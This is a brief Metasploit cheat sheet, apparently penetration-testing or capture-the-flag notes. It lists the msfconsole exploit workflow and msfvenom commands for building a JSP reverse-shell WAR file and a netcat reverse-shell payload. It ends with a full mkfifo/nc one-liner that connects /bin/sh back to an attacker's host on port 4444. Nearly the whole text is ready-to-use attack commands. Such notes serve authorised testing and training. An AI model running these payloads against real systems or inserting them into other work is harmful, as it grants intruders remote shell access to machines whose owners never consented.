
MSFconsole
---
```
search $TARGET_SERVICE
use X
 options
set LHOST
set RHOST
exploit
shell
background
```

See payload options:

```shell
msfvenom -p java/jsp_shell_reverse_tcp --list-options
```

Create payload:

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LOCAL_IP LPORT=4444 -f war > runme.war
```

Create bash reverse shell line:

```shell
msfvenom -p cmd/unix/reverse_netcat RHOST=tun0 RPORT=4444 R
```

```shell
mkfifo /tmp/ipvquh; nc $LOCAL_IP 4444 0</tmp/ipvquh | /bin/sh >/tmp/ipvquh 2>&1; rm /tmp/ipvquh
```

